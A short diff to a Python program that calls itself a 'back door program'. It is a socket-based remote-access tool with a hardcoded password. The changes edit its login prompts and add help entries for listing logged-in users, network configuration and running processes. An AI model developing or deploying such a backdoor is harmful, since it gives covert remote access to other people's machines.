@@ -4,8 +4,8 @@ import socket, threading
 import subprocess
 
 password = "password\n"
-passwordRequest = "Please enter the password\n"
-incorrectPw = "Incorrect password\n"
+passwordRequest = "Please enter the password or disconnect by inputting \"off\"\n"
+incorrectPw = "Incorrect password you may disconnect by inputting \"off\"\n"
 welcome = "Welcome back!\n"
 
 def cat_com(fileName):
@@ -39,8 +39,9 @@ def cd_com(relPath):
         return("No such path "+path+"\n")
 
 def hlp_com():
-    return ("pwd - returns current working directory\ncd <dir> - changes currentworking directory to <dir>\n"
-            + "ls - list content of the curent working directory\ncat <file> - return contents of the file\n"
+    return ("pwd - returns current working directory\ncd <dir> - changes current working directory to <dir>\n"
+            + "ls - list content of the current working directory\ncat <file> - return contents of the file\n"
+            +"who - list user[s] currently logged in\nnet - show the network configuration\nps - show the currently running processes\n"
             +"off - terminates the back door program\n")
 
 def who_com():
